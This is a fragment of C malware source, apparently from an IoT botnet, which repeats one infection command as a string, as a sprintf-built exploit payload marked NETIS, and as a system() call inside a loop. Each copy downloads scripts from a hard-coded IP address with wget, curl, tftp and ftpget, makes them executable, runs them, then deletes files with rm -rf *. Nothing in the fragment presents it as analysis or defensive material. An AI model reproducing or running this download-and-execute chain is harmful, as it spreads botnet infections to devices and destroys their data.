...
char *hvgsgd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.219.94/moji.sh; curl -O http://80.211.219.94/moji.sh; chmod 777 moji.sh; sh moji.sh; tftp 80.211.219.94 -c get matty1.sh; chmod 777 matty1.sh; sh matty1.sh; tftp -r matty2.sh -g 80.211.219.94; chmod 777 matty2.sh; sh matty2.sh; ftpget -v -u anonymous -p anonymous -P 21 80.211.219.94 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf moji.sh matty1.sh matty2.sh ftp1.sh; rm -rf *\r\n";
...
sprintf(payload2, "%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.219.94/moji.sh; curl -O http://80.211.219.94/moji.sh; chmod 777 moji.sh; sh moji.sh; tftp 80.211.219.94 -c get matty1.sh; chmod 777 matty1.sh; sh matty1.sh; tftp -r matty2.sh -g 80.211.219.94; chmod 777 matty2.sh; sh matty2.sh; ftpget -v -u anonymous -p anonymous -P 21 80.211.219.94 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf moji.sh matty1.sh matty2.sh ftp1.sh; rm -rf *\r\n x00", NETIS);
...
int i;
for(i = 0; i < 9; i++){
system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.219.94/moji.sh; curl -O http://80.211.219.94/moji.sh; chmod 777 moji.sh; sh moji.sh; tftp 80.211.219.94 -c get matty1.sh; chmod 777 matty1.sh; sh matty1.sh; tftp -r matty2.sh -g 80.211.219.94; chmod 777 matty2.sh; sh matty2.sh; ftpget -v -u anonymous -p anonymous -P 21 80.211.219.94 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf moji.sh matty1.sh matty2.sh ftp1.sh; rm -rf *\r\n");
return;
}
sleep(5);
}
